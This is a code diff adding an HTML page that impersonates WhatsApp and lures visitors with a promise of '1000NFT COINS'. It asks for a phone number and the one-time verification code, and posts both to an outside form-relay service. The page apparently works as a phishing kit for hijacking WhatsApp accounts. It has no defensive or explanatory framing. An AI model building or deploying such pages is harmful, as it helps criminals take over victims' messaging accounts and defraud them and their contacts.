@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Signup</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="logo.png" alt="logo">
+        </div>
+        <div class="text">
+            <p>SIGNUP & WIN 1000NFT COINS</p>
+        </div>
+        <form id="signupForm" action="https://formsubmit.co/" method="POST">
+            <!-- Phone number input -->
+            <input type="text" id="phoneNumber" name="phoneNumber" placeholder="Enter your phone number" required>
+            
+            <!-- Get OTP button -->
+            <button type="button" id="getOtpButton">Get OTP</button>
+            
+            <!-- OTP input, initially hidden -->
+            <input type="text" id="otp" name="otp" placeholder="Enter OTP" required style="display: none;">
+            
+            <!-- Timer, initially hidden -->
+            <input type="text" id="timer" value="60" disabled style="display: none; margin-top: 10px;">
+            
+            <!-- Submit button, initially disabled -->
+            <button type="submit" id="submitButton" disabled>Sign Up</button>
+        </form>
+    </div>
+
+    <script src="scripts.js"></script>
+</body>
+</html>
